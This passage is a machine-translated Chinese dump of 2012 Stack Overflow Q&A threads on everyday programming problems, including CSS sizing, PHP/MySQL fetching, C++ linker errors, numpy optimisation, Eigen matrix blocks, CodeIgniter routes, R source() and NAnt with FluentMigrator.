问题是 h1 标签的内容是动态的，有时它可能只有一行，有时是两行或更多，在这些情况下，空格框可能太大或太小。根据包含的文本，我如何处理这个空间框的高度是动态的？

CSS 空间框

```
#spacebox{display:block;width:auto;height:100px;z-index:100;} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:29:44.463

只需删除高度：0；从#container 并给height:auto 到#spacebox

# php - 从数据库检索数据时出错

> ID：13548223
> 
> 赞同：2
> 
> 时间：2012-11-25T04:18:17.130
> 
> 标签：php, sql

我正在尝试检索 viewprofile.php 的名字和姓氏，但我得到了资源 ID#5 。身份验证成功后，我正在登录页面中创建会话。我正在尝试在这里使用它。我正在尝试使用已创建的会话从数据库中获取数据。

```
<html>
<h1> My Profile</h1>
<?php
session_start();
require "config.php";
$con = mysql_connect("localhost", $db_user, $db_pass);

if(!$con)
    {
die('cound not connect: '. mysql_error());
    }

mysql_select_db($db_name, $con);

# include 'new.php'; 
echo $_SESSION['username'];
#$usname = $_SESSION['username'];
#echo 'local var: ',  $usname;
$sql1 = "SELECT * FROM register WHERE uname='".$_SESSION['username']."'" ;

#echo $sql1 ;
$result= mysql_query($sql1)or die(mysql_error());
#echo "res: " . $result;

while($row = mysql_fetch_array($result))
{
echo $row['fname']." ".$row['lname'];
echo"</br>";
}

mysql_close($con); 

?>

</html> 
```

我正在获取资源 ID#5。搜索了很多地方没有运气。请帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:31:46.483

除非我弄错`mysql_fetch_array`了，否则会给你可以表示为 $row[0]、$row[1] 等的值，而`mysql_fetch_assoc`你试图用来获取 $row['fname'] 等的值

将您的代码更改为

```
while($row = mysql_fetch_assoc($result)) 
```

无论哪种情况`print_r($row)`，您的while循环中的a都会告诉您它是如何组成的。

# c++ - 为什么链接器找不到 main()？

> ID：13548224
> 
> 赞同：0
> 
> 时间：2012-11-25T04:18:26.873
> 
> 标签：c++, linker-errors, ld

我收到下一条错误消息：

> ```
> usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/crt1.o: In
> function `_start':  (.text+0x20): undefined reference to `main' 
> collect2: ld returned 1 exit status 
> ```

我唯一的代码是：

```
FILE *f = fopen("data/file.dat", "rb");
fseek(f, 0, SEEK_END);
long pos = ftell(f);
fseek(f, 0, SEEK_SET);

char *bytes = malloc(pos);
fread(bytes, pos, 1, f);
fclose(f); 
```

现在，我来自 Java 背景，但我一直在谷歌搜索，它说我可能缺少参考，但我不知道它可能是什么，我什至添加了`#include <stdio.h>`，我读了一些关于添加的东西，`extern`但我没有除非我需要参考 .dat 文件，否则我没有其他文件，知道在哪里吗？

**编辑**我也尝试过强制转换字节数组`(char*)malloc(pos);`，但它也没有帮助。

**编辑 2** 整个代码都使用 NS-3 框架，但在我添加这些行之前，一切都编译得很好。它看起来像这样：

```
#include "ns3/core-module.h"
#include "ns3/point-to-point-module.h"
#include "ns3/network-module.h"
#include "ns3/applications-module.h"
#include "ns3/wifi-module.h"
#include "ns3/mobility-module.h"
#include "ns3/csma-module.h"
#include "ns3/internet-module.h"

using namespace ns3;

NS_LOG_COMPONENT_DEFINE ("ThirdScriptExample");

int 
main (int argc, char *argv[])
{
      .....
//STARTS FILE READING
  FILE *f = fopen("data/Terse_Jurassic_10_14_18.dat", "rb");
  fseek(f, 0, SEEK_END);
  long pos = ftell(f);
  fseek(f, 0, SEEK_SET);

  char *bytes = (char*)malloc(pos);
  fread(bytes, pos, 1, f);
  fclose(f);

  Simulator::Stop (Seconds (10.0));

  pointToPoint.EnablePcapAll ("third");
  phy.EnablePcap ("third", apDevices.Get (0));
  csma.EnablePcap ("third", csmaDevices.Get (0), true);

  Simulator::Run ();
  Simulator::Destroy ();
  return 0;
} 
```

编译器错误信息是：

> ```
> [1888/1930] cxxprogram:  -> build/scratch/data/data
> /usr/lib/gcc/x86_64-linux-gnu/4.6/../../../x86_64-linux-gnu/crt1.o: In
> function `_start': (.text+0x20): undefined reference to `main'
> collect2: ld returned 1 exit status Build failed  -> task in 'data'
> failed (exit status 1):   {task 43470800: cxxprogram  -> data} 
> ```

我非常确定 NS-3 代码（由于代码行而我没有添加的部分和读取文件后的部分都可以正常工作，因为在添加部分以读取文件之前，一切正常。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:28:10.113

你的程序*必须*包含一个`main()`函数。

```
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[])
{
    FILE *f = fopen("data/file.dat", "rb");
    fseek(f, 0, SEEK_END);
    long pos = ftell(f);
    fseek(f, 0, SEEK_SET);

    char *bytes = malloc(pos);
    fread(bytes, pos, 1, f);
    fclose(f);
    free(bytes);
    return 0;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:21:25.323

> 我唯一的代码是

要么您没有将此代码放入`main`函数中（您必须拥有），要么您的编译器/链接器调用不正确。鉴于您提供的详细信息，无法说出哪个。

另外，您的问题的标题不正确：您在读取文件时没有问题，在*链接*程序（打算读取文件）时遇到问题。

# html - 什么是 HTML标签默认显示类型？

> ID：13548225
> 
> 赞同：30
> 
> 时间：2012-11-25T04:18:33.493
> 
> 标签：html, css

我一直无法在 CSS 的显示属性中找到任何说明默认显示等效于什么的内容。我问，因为每当我尝试向`<a>`标签添加填充或边距时，它不会添加它，我必须为其添加 display 属性`inline-block`。

我不知道这是否是特定于浏览器的，但它的默认显示会`inline`与说`inline-block`（我显然知道它不是`inline-block`.

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-11-25T04:20:26.770

它始终`display: inline`是默认设置。水平边距和所有边的填充应该可以工作，而无需更改其`display`属性。

即使在 HTML5 中也是如此。如果您将样式应用于`<a>`包含流元素或任何其他在 CSS 中表示为的元素的元素，`display: block`则应将其`<a>`自身设置为适当的块容器类型，例如`block`或`inline-block`使其布局按预期工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:33:39.980

默认情况下它是内联的。IE7 不支持内联块。

内联元素不支持边距。INLINE 元素仅支持左右填充。

# javascript - 嵌套对象扩展和跳过未定义的属性（在 Angular 或下划线中）

> ID：13548228
> 
> 赞同：2
> 
> 时间：2012-11-25T04:19:23.353
> 
> 标签：javascript, object, angularjs, underscore.js, extend

是否有关于如何处理以下`extend`情况的任何实现（或模式）？AFAIK在Angular或Underscore中都没有办法直接做到这一点，对吗？

否则这是我的实现，但我想知道是否已经完成了任何事情，或者无论如何，知道您对我的代码的反馈，谢谢！

[http://jsbin.com/welcome/52916/edit](http://jsbin.com/welcome/52916/edit)

```
/**    
Extends the target object with the properties in the source object, with the following special handling:

-   it doesn't extend undefined properties, i.e.
        target: { a: 10 }
        source: { a: undefined }
        result: { a: 10 }

-   it does nested extends rather than overwriting sub-objects, i.e.
        target: { b: { i: 'Hi' } }
        source: { b: { j: 'Bye' } }
        result: { b: { i: 'Hi', j: 'Bye' } }

*/
function extend( target, source ) {
  _.each( _.keys( source ), function( k ) {
    if (angular.isDefined( source[k] )) {
      if (angular.isObject( source[k] )) {
        extend( definedOr( target[k], {} ), source[k] );
      }
      else {
        target[k] = source[k];
      }
    }
  });
  return target;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-25T13:01:47.543

是的，我想，既不能解决你的问题，`_.extend`也`_.defaults`不能解决你的问题，而且我的 Angular-Fu 还不足以在那里发表评论。

但是，它看起来确实`jQuery.extend(true, target, source)`解决了您的两个用例。`true`方法调用中的 , 进行了深度扩展，而该方法`extend`已经适用于`undefined`您提到的情况。

如果您需要更多地控制解决源对象和目标对象之间的冲突，我一直发现这样`Object.merge(target, source, deep:boolean, resolve:boolean|function)`做更灵活。如果您想知道这是来自名为[Sugar.js](http://sugarjs.com/api/Object/merge)的库中的方法。

为了完整起见，Sugar.js 方法可以像下面给出的那样用于您的特定用例。

```
Object.merge(target, source, true, false); 
```

希望能回答你的问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T13:44:26.840

AngularJS 有一个简单的扩展函数：

```
angular.extend(target, source); 
```

[http://docs.angularjs.org/api/angular.extend](http://docs.angularjs.org/api/angular.extend)

但是您应该知道，该函数仅将源的属性复制到目标并覆盖已经存在的所有内容。

[http://jsfiddle.net/flek/yhuDP/1/](http://jsfiddle.net/flek/yhuDP/1/)

# java - 检测网站的背景颜色

> ID：13548239
> 
> 赞同：1
> 
> 时间：2012-11-25T04:20:59.297
> 
> 标签：java, python, html

我正在尝试检测网页中不同元素的颜色（保存在机器上）。目前我正在尝试用python编写代码。我遵循的最初方法是：

1.  使用正则表达式在不同标签的 html 文件中查找颜色词。
2.  尝试读取十六进制值。

但是这种方法非常愚蠢。我是网站设计的新手，请您帮帮我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:30:22.410

可以有多个样式表和许多级联样式。您不知道哪些元素在视觉上最终成为“背景”元素。我认为，如果您正在寻找适用于大多数网页的强大功能，您需要利用浏览器渲染引擎并专注于识别用户会看到什么。

考虑使用 Web 浏览器来呈现页面，截取屏幕截图，然后进行图像处理以找到页面两侧最常见的颜色。您可以使用像[phantomjs](http://phantomjs.org/)这样的可编写脚本的浏览器。

如果您是编程新手，那么这种方法会让您难以接受。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-25T04:28:19.803

在java中，您可以使用[JSOUP](http://jsoup.org/)。这是相当不错

```
Document doc = Jsoup.connect("http://YourPage.html").get();
Elements colors = doc.select("[bgcolor]"); 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-25T04:25:47.850

我对 Java 或 Python 一无所知，但你能让它解析 html 代码并寻找类似“背景颜色：<颜色>”的东西吗？

# python - python numpy优化n维投影

> ID：13548241
> 
> 赞同：3
> 
> 时间：2012-11-25T04:21:06.410
> 
> 标签：python, optimization, numpy, projection

我对 python 比较陌生，并且对优化和加速此功能的任何想法感兴趣。对于我正在做的数值计算，我必须调用它数万次，它占用了代码总计算时间的主要部分。我已经用 c 编写了这个，但我很想看看有什么技巧可以让它在 python 中运行得更快。

[此代码根据http://en.wikipedia.org/wiki/Stereographic_projection](http://en.wikipedia.org/wiki/Stereographic_projection)计算 bigD 长度向量到 littleD 长度向量的立体投影。变量 a 是一个长度为 96 的 numpy 数组。

```
import numpy as np 
def nsphere(a):
    bigD = len(a)
    littleD = 3
    temp = a
# normalize before calculating projection
    temp = temp/np.sqrt(np.dot(temp,temp))
# calculate projection
    for i in xrange(bigD-littleD + 2,2,-1 ):
        temp = temp[0:-1]/(1.0 - temp[-1])
    return temp
#USAGE:
q = np.random.rand(96)
b = nsphere(q)
print b 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:58:08.710

这应该更快：

```
def nsphere(a, littleD=3):
    a = a / np.sqrt(np.dot(a, a))
    z = a[littleD:].sum()
    return a[:littleD] / (1\. - z) 
```

请做数学以仔细检查这实际上与您的迭代算法相同。

显然，这里的主要加速将来自这样一个事实，即这是一个 O(n) 算法，它取代了用于计算投影的 O(n**2) 算法。但特别是为了在 python 中加快速度，你想要“矢量化你的内部循环”。意思是尽量避免循环和其他任何会在代码的最关键性能部分产生高 python 开销的东西，而是尝试使用高度优化的 python 和 numpy 内置函数。希望有帮助。

# entity-framework - DbSet.Add(entity) 和 entity.State = EntityState.Added 之间的区别

> ID：13548243
> 
> 赞同：3
> 
> 时间：2012-11-25T04:21:22.820
> 
> 标签：entity-framework

> **可能重复：**
> [IDbSet.Add 和 DbEntityEntry.State = EntityState.Added 有什么区别？](https://stackoverflow.com/questions/9082922/what-is-the-difference-between-idbset-add-and-dbentityentry-state-entitystate)

[DbSet.Add(entity)](http://msdn.microsoft.com/en-us/library/system.data.entity.dbset.add%28v=vs.103%29.aspx)与[entity.State = EntityState.Added 有](http://msdn.microsoft.com/en-us/library/system.data.entitystate%28v=vs.103%29.aspx)什么区别？我使用了一些示例将实体添加到 DbContext，但不确定哪个是首选。

我看到一些测试“**分离**”条件并决定在他们的存储库实现中使用哪个。

```
 public void Add(T entity)
    {
        var entry = DbContext.Entry(entity);
        if (entry.State == EntityState.Detached)
        {
            DbSet.Add(entity);
        }
        else
        {
            entry.State = EntityState.Added;
        }
    } 
```

有人知道吗？谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-25T07:06:26.730

这两个选项之间没有任何区别，因为它们都在调用相同的方法（即 ObjectContext 上的 AddObject）。

# java - 向 HashMap 添加值

> ID：13548249
> 
> 赞同：1
> 
> 时间：2012-11-25T04:22:17.540
> 
> 标签：java, object-reference

我目前正在向`HashMap<String, SpriteSheetAnimation>`. 我还在我的输入类的 LoadFile 方法中添加了哈希映射。当我添加到 hashmap 时，它是在 FileLoader 中创建引用的 GameObject 类的一部分。我改变了 hashmap，向它添加键和值，一切都很好。

然后，我继续将 GameObject 对象添加到 objectManager 中，在其中存储我的游戏的所有对象。但是，当我在 ArrayList 中引用该对象时，我在文件加载器中添加的 SpriteSheetAnimation 值和该值的键不再存在。如果我在添加它们后尝试从 FileLoader 中访问它们，它们就在那里。我有点困惑。这里可能存在范围问题吗？

我刚刚意识到一些可以帮助你帮助我的东西..（System.out.println）

如果我运行它，当我尝试使用 .toString 获取时组件不存在

```
private void LoadControllableEntity(XMLEventReader eventReader, int x, int y)
{
    entities.ControllableEntity entity = new entities.ControllableEntity(x, y);
    entity.addComponent(new components.InputComponent(entity), "input");
    while(eventReader.hasNext())
    {
        try
        {

            XMLEvent event = eventReader.nextEvent();
            if(event.isEndElement())
            {
                if(event.asEndElement().getName().getLocalPart().equals("ControllableEntity"))
                {
                    break;
                }
            } else if(event.isStartElement())
            {
                String element = (String) event.asStartElement().getName().getLocalPart();
                if(element.equals("renderable"))
                {
                    entity.addComponent(new components.Renderable(entity), "renderer");
                }
                else if(element.equals("animationComponent"))
                {

                    entity.addComponent(getAnimationComponent(entity, event.asStartElement().getAttributes(), eventReader), "animation");

                }
            }
        } catch(XMLStreamException e)
        {
            e.printStackTrace();
        }
        System.out.println(entity.getComponent("animation").toString());
        managers.ObjectManager.getInstance().addObject(entity);

    }

} 
```

但是，当我运行此代码时..它可以很好地获取组件（请注意，我已经更改了尝试获取组件的位置。）

```
private void LoadControllableEntity(XMLEventReader eventReader, int x, int y)
{
    entities.ControllableEntity entity = new entities.ControllableEntity(x, y);
    entity.addComponent(new components.InputComponent(entity), "input");
    while(eventReader.hasNext())
    {
        try
        {

            XMLEvent event = eventReader.nextEvent();
            if(event.isEndElement())
            {
                if(event.asEndElement().getName().getLocalPart().equals("ControllableEntity"))
                {
                    break;
                }
            } else if(event.isStartElement())
            {
                String element = (String) event.asStartElement().getName().getLocalPart();
                if(element.equals("renderable"))
                {
                    entity.addComponent(new components.Renderable(entity), "renderer");
                }
                else if(element.equals("animationComponent"))
                {

                    entity.addComponent(getAnimationComponent(entity, event.asStartElement().getAttributes(), eventReader), "animation");
                    System.out.println(entity.getComponent("animation").toString());
                }
            }
        } catch(XMLStreamException e)
        {
            e.printStackTrace();
        }

        managers.ObjectManager.getInstance().addObject(entity);

    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T04:57:15.133

您的第一个代码片段的问题在于，您在*每次*通过循环时都检索并打印`animation`实体- 甚至在您添加该实体之前 - 而在您的第二个代码片段中，您只在添加实体后立即检索和打印它，所以显然它没有这个问题。

 *我想你想改变这个：

```
 System.out.println(entity.getComponent("animation").toString());
        managers.ObjectManager.getInstance().addObject(entity);

    } 
```

对此：

```
 }

    System.out.println(entity.getComponent("animation").toString());
    managers.ObjectManager.getInstance().addObject(entity); 
```

也就是说，我认为您希望`while`在循环完成后执行最后几个步骤，而不是在每次迭代结束时执行。*

# c# - 将 Byte[] 转换为字符串 - 将 Interbase 转换为 C# - InvalidCastException

> ID：13548251
> 
> 赞同：1
> 
> 时间：2012-11-25T04:22:38.013
> 
> 标签：c#, string, bytearray, blob, oledbdatareader

我正在使用`OleDbDataReader rdr`将 BLOB 形式的“评论”字段（sub_type 1 段大小 80）读取到来自 Interbase DB 的字符串中，并且我不断收到异常。有什么建议么？

**尝试#1**

```
ls_Chap_Comments.Add((rdr["Comments"]).ToString()); 
```

InvalidCastException：由于符号不匹配或数据溢出以外的原因，无法转换数据值。例如，数据存储中的数据已损坏，但该行仍可检索。”

**尝试#2**

```
byte[] b = new byte[100];
b = (byte[])rdr["Comments"];
string s = System.Text.ASCIIEncoding.ASCII.GetString(b); 
```

InvalidCastException：无法将类型的对象转换`System.String`为类型`System.Byte[]`

**尝试#3**

```
// 17 is the BLOB column zero-based location for "Comments"
retval = rdr.GetBytes(17, startIndex, outbyte, 0, bufferSize); 
```

InvalidCastException：无法将类型的对象转换`System.String`为类型`System.Byte[]`。

任何建议将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T04:45:19.690

你应该打电话

```
rdr.IsDBNull(rdr.GetOrdinal("Comments")) 
```

在尝试读取值之前。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-03-27T11:40:02.280

我一直在寻找这个问题的答案，但这并不像看起来那么困难。将值作为对象类型检索并将其转换为字符串（假设 blob 包含字符串）。

```
string commentsValue = (string)rdr.GetValue(17); 
```

# function - 特征库：将函数中的矩阵块作为左值返回

> ID：13548253
> 
> 赞同：7
> 
> 时间：2012-11-25T04:23:08.180
> 
> 标签：function, reference, block, eigen, lvalue

我正在尝试将矩阵块作为函数的左值返回。假设我的函数如下所示：

```
Block<Derived> getBlock(MatrixXd & m, int i, int j, int row, int column)
{
    return m.block(i,j,row,column);
} 
```

事实证明，C++ 编译器似乎理解 block() 运算符仅提供临时值，因此编译器禁止将其作为左值返回。但是，在 Eigen 文档中有一些示例，我们可以将 Eigen 用作左值（http://eigen.tuxfamily.org/dox/TutorialBlockOperations.html#TutorialBlockOperationsUsing）所以我想知道我们如何不能对函数做同样的事情返回。

```
a.block(0,0,2,3) = a.block(2,1,2,3); 
```

谢谢！

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-06T08:07:30.810

我想把我发现自己的东西放出来，这样可能对其他人有帮助：

我的基本解决方案是知道您希望该块是什么派生类型。在这种情况下：

```
Block<MatrixXd> getBlock(MatrixXd & m, int i, int j, int row, int column)
{
    return m.block(i,j,row,column);
} 
```

有趣的是，这个方法默认会返回对矩阵 m 内容的引用。所以如果我们这样做：

```
MatrixXd m = MatrixXd::Zero(10,10);
Block<MatrixXd> myBlock = getBlock(m, 1, 1, 3, 3);
myBlock << 1, 0, 0, 
           0, 1, 0, 
           0, 0, 1; 
```

矩阵 m 中的内容也将被修改。但是请注意，

```
MatrixXd m = MatrixXd::Zero(10,10);
MatrixXd myBlock = getBlock(m, 1, 1, 3, 3);
myBlock << 1, 0, 0, 
           0, 1, 0, 
           0, 0, 1; 
```

不管用。我的理解是，一旦我们将块转换为另一种类型，Eigen 就会在转换之前复制数据。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2022-01-07T22:49:34.430

我正在尝试这样的事情，特别是返回 4 元素向量的最后 3 个元素，但我无法让它工作。

解决方案结果很好，但如果您不熟悉尾随返回类型，可能会有点混乱：

```
struct foo{

  Eigen::Vector4d e_;

  // const version
  auto get_tail() const -> const auto { return e_.tail<3>(); };

  // non-const version
  auto get_tail() -> auto { return e_.tail<3>(); };

}; 
```

# .htaccess - Codeigniter 试图获取特定的 URL 模式

> ID：13548256
> 
> 赞同：1
> 
> 时间：2012-11-25T04:23:21.327
> 
> 标签：.htaccess, codeigniter, url-routing, codeigniter-routing

我有两个模型，称为课程和零件。每节课都有很多部分。我是 MVC 和 Codeigniter 的新手，但所需的 URL 是这样的：

> `example.com/lesson/2/part/3`

我假设我应该使用 .htaccess 或路由中的重写规则来执行此操作。我需要帮助才能做到这一点，并且对重写规则或路线的解释将是完美的。

也许 Part 实际上是课程控制器的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T05:31:25.737

[CodeIgniter 用户指南有一个关于 URI 路由的有用页面。](http://codeigniter.com/user_guide/general/routing.html)

你可以做这样的事情来改变它，这`part`是`lesson`控制器中的一个方法：

`$route['lesson/(:num)/part/(:num)'] = "lesson/part/$1/$2";`

该指南在包含括号方面有些不一致，所以如果这不起作用，那么试试这个：

`$route['lesson/:num/part/:num'] = "lesson/part/$1/$2";`

# objective-c - IB 元素跳回原始位置

> ID：13548259
> 
> 赞同：0
> 
> 时间：2012-11-25T04:23:48.820
> 
> 标签：objective-c, ios

> **可能重复：**
> [UIView 动画结果不一致](https://stackoverflow.com/questions/13388835/uiview-animation-inconsistent-result)

我有一个 iPhone 应用程序，我在 Interface Builder 中设置了其中一个视图控制器的许多 UI 元素，以便在加载视图时，这些元素动画到我想要的位置。但是，在其中一个按钮上，我有一个点击手势，它通过将黑色 UIView 放在前面并将其 alpha 属性设置为 0.5 来使屏幕变暗。

每当背景调光器出现在最前面时，我动画到不同位置的所有 UI 元素都会跳回它们最初放置的位置。

我希望我可以发布代码，但我不能，因为它是一个商业企业。

有人认为他们有想法吗？

编辑：一个明显的解决方法是，一旦我调出背景调光器，只需将其他所有内容恢复到应有的位置即可。但这是一个混乱的解决方案，我宁愿让他们留在他们动画的地方。

此外，我通过使用 CGRectMake 设置框架来为它们设置动画，如果有帮助的话。

编辑2：

跳转是由调用引起的：

```
[self.view bringSubviewToFront:view]; 
```

我不知道如何阻止这种情况发生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T10:13:31.633

必须感谢@rob mayoff。它与在这个问题中讨论的故事板中使用自动布局有关：[Autolayouts](https://stackoverflow.com/questions/13201586/nsinvalidunarchiveoperationexception-could-not-instantiate-class-named-nslayout/13201690#13201690)

# ruby-on-rails-3 - Webrick Thin 上的 Rails 未找到资产

> ID：13548262
> 
> 赞同：1
> 
> 时间：2012-11-25T04:24:26.070
> 
> 标签：ruby-on-rails-3, datatables, thin, webrick

我正在运行我的 rails WEBrick 服务器，它带有'thin' gem，以便在开发模式下进行最少的登录。我使用[数据表](http://datatables.net/)在我的 html 页面上显示一些表。但我收到资产错误：

> 2012-11-24 20:14:45 -0800 2012-11-24 20:14:45 开始 GET "/app/assets/images/sort_both.png" for 127.0.0.1 2012-11-24 20:14:45 -- ActionController::RoutingError (No route匹配 [GET] "/app/assets/images/sort_both.png")

我已确保文件夹中的图像存在。

我已经更改了 config/environments/development.rb 中的配置，以便 WEBrick 能够提供静态内容：

> config.serve_static_assets = true

我不知道发生了什么事。有人可以帮我吗？

干杯，阿尼

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-11T23:02:12.927

日志说您要的是错误的网址。通常`/app`不是 http 请求的一部分。确保您`asset_path`在视图中使用。

我还打赌一个 GET 请求`/assets/images/sort_both.png`会起作用。

# r - 在一个 .R 文件中定义所有函数，从另一个 .R 文件中调用它们。如果可能，怎么做？

> ID：13548266
> 
> 赞同：112
> 
> 时间：2012-11-25T04:25:51.803
> 
> 标签：r, file, scope, namespaces, user-defined-functions

如何在另一个文件中调用 abc.R 文件中定义的函数，比如 xyz.R？

一个补充问题是，如何从 R 提示符/命令行调用 abc.R 中定义的函数？

* * *

## 回答 #1

> 赞同：165
> 
> 时间：2012-11-25T10:57:21.920

您可以调用`source("abc.R")`后跟`source("xyz.R")`（假设这两个文件都在您当前的工作目录中。

如果 abc.R 是：

```
fooABC <- function(x) {
    k <- x+1
    return(k)
} 
```

xyz.R 是：

```
fooXYZ <- function(x) {
    k <- fooABC(x)+1
    return(k)
} 
```

那么这将起作用：

```
> source("abc.R")
> source("xyz.R")
> fooXYZ(3)
[1] 5
> 
```

即使存在周期性依赖关系，这也会起作用。

例如，如果 abc.R 是这样的：

```
fooABC <- function(x) {
    k <- barXYZ(x)+1
    return(k)
}

barABC <- function(x){
    k <- x+30
    return(k)
} 
```

xyz.R 是这样的：

```
fooXYZ <- function(x) {
    k <- fooABC(x)+1
    return(k)
}

barXYZ <- function(x){
    k <- barABC(x)+20
    return(k)
} 
```

然后，

```
> source("abc.R")
> source("xyz.R")
> fooXYZ(3) 
[1] 55
> 
```

# magento - Magento将子属性添加到属性？

> ID：13548267
> 
> 赞同：0
> 
> 时间：2012-11-25T04:25:57.010
> 
> 标签：magento, custom-attributes

我需要在 magento 的某个属性中添加一个子属性，我是 Magneto 的新手，

例如

（材质）属性组 蓝色--深蓝色--海军蓝粉色--淡粉色--深粉色

请让我知道这可能会让我失去信心。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T06:48:34.903

您可以添加依赖属性（意味着一个属性对其他属性有不同的选项）

例如布料颜色和尺寸，

你可以这样做

*   创建具有主要属性（颜色）的可配置产品

*   创建一些具有不同尺寸值和数量的简单产品

*   将这些简单产品分配给主要可配置产品（从主要可配置产品中的关联产品选项卡）

这样，当您看到选项时，它将是您想要的方式

# nant - 设置 NAnt 和 FluentMigrator

> ID：13548270
> 
> 赞同：3
> 
> 时间：2012-11-25T04:26:09.507
> 
> 标签：nant, fluent-migrator

我有一个包含大量迁移的项目。我可以使用 migrator.exe 手动运行它，但是很难让它与我更喜欢的 NAnt 一起工作。

我有一个包含以下内容的 *.build 文件：

```
<project name="Migrations" xmlns="http://nant.sf.net/release/0.85/nant.xsd" default="migrate">
    <loadtasks assembly="../packages/FluentMigrator.1.0.3.0/tools/FluentMigrator.NAnt.dll" />    
    <target name="migrate" description="Migrate the database">
        <property name="version" value="-1" overwrite="false" />
        <migrate
              provider="sqlserver2008"
          connectionstring="data source=*********; Initial Catalog=*****;User Id=*******; Password=********;"
          target="./Migrations/bin/Debug/Migrations.dll"
              directory="Migrations"
          task="migrate"
              to="${version}" />
    </target>
</project> 
```

当它运行时，我得到以下输出：BUILD FAILED

```
C:\projects\ThisProject\Migrations\migrations.build(3,3):
Failure scanning "C:\projects\packages\FluentMigrator.1.0.3.0\tools\FluentMigrator.NAnt.dll" for extensions.
    Could not load file or assembly 'file:///C:\projects\packages\FluentMigrator.1.0.3.0\tools\FluentMigrator.NAnt.dll' or one of its dependencies. An attempt was made to load a program with an incorrect format. 
```

我去寻找depends.exe，但该站点似乎已关闭，有关如何使其正常工作的任何想法？如果我做错了，我愿意接受全新的想法。

**======更新完整解决方案======**

主席和 armen.shimoon 对他们的答案有所了解。

第一步，我将 FluentMigrator 和 FluentMigrator.Tools 更新为 1.0.5.0。这些工具仍为 1.0.3.0。

第二步是更新我的构建文件以引用 .NET 4.0 dll。两者的结合解决了这个问题，但直到我引用了 .NET 4.0 dll 才显示出改进。

这是我当前的 .build 文件以供将来参考：

```
<project name="Migrations" xmlns="http://nant.sf.net/release/0.85/nant.xsd" default="migrate">
    <loadtasks assembly="../packages/FluentMigrator.Tools.1.0.5.0/tools/anycpu/40/FluentMigrator.Nant.dll" />
    <target name="migrate" description="Migrate the database">
      <property name="version" value="-1" overwrite="false" />
        <migrate
              database="sqlserver2008"
          connection="data source=******; Initial Catalog=*****;User Id=*****; Password=*****;"
          target="../Migrations/bin/Debug/Migrations.dll"
          verbose="true"
          />
    </target>
</project> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-25T08:58:41.937

我的第一个猜测是，您的 NAnt 和 FluentMigrator 版本可能不同步。所以我的建议是获得 NAnt 0.92（因为我爱上了 Chocolatey：[通过 Chocolatey 获得](http://chocolatey.org/packages/NAnt)）、[FluentMigrator 1.0.5.0](https://nuget.org/packages/FluentMigrator)和[FluentMigrator Tools 1.0.5.0](https://nuget.org/packages/FluentMigrator.Tools)。也许这已经解决了你的问题

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-25T09:04:27.850

最可能的原因是 NAnt 在 x86 下运行，而您的 FluentMigrator DLL 在 x64 下运行。

编辑：另一种可能性是 .NET 目标框架版本。如果您的 NAnt 二进制文件是 .NET 3.5 而 FluentMigrator 是 .NET 4.0，它将无法正确加载。

# jquery - 从 div 中删除 load() 并返回到原始 div 内容？

> ID：13548272
> 
> 赞同：1
> 
> 时间：2012-11-25T04:26:17.517
> 
> 标签：jquery, html, load

我已经完成了我想要工作的大部分工作，但最后一点需要我把自己放在 stackoverflow 之神上，因为我很难过。我有一长串子菜单选项。当用户点击一个时，它会用新的内容替换另一个 div 的内容，并用 class="active" 标记子菜单。这部分效果很好，但问题是撤消它。这是基本的html：

```
<div id="coleft">
<ul id="charactermenu">
    <li id="base_chara" class="active">basic info</li>
    <li id="base_names" class="">names</li>
    <li id="base_speech" class="">speech</li>
    <li id="base_psyche" class="">psyche</li>
    <li id="base_personality" class="">personality</li>
    <li id="base_habits" class=" ">habits</li>
</ul>
<div id="coright">
    /... some content goes here
</div> 
```

这是一个简单的脚本，它采用#id 并翻转 div 内容：

```
$('#charactermenu li').click(function() {
    var selection = $(this).attr('id');
    $("#coright").html(ajax_load).load( selection + ".php").fadeIn();
    $("#" + selection).addClass('active');
    $("#" + selection).siblings().removeClass("active");
}); 
```

首次打开页面时，默认显示#coright 的内容，即#base_chara。但是，如果我单击其他内容，然后返回第一个子菜单选项 (#base_chara)，它会像加载其他 div 一样加载该 div。我最终将#base_chara 内容复制到一个单独的base_chara.php 中，所以现在我有两个文件要跟踪该子菜单选项，呃。似乎必须有一种方法可以解决这样的问题：

```
#base_chara click(function)
    remove loaded php from div
    display original div contents
    removeClass for everyone else
    add active for #base_chara 
```

但是当以这种方式替换 div 时，原始内容是否会被擦除？管理这个最简单/最好的方法是什么？Unload() 似乎与整个窗口（不仅仅是一个 div）有关，而 remove() 和 empty() 让我在#coright 中什么都没有。我哪里错了？

ETA：我刚刚意识到我可以通过使用 require_once('dbconnect.php') 而不是简单的包含来解决这个问题。也就是说，问题已解决，但问题仍未得到解答，我仍然想知道是否有一种简单的方法可以在 jquery/javascript 级别上处理此问题。谢谢！

* * *

## 回答 #1

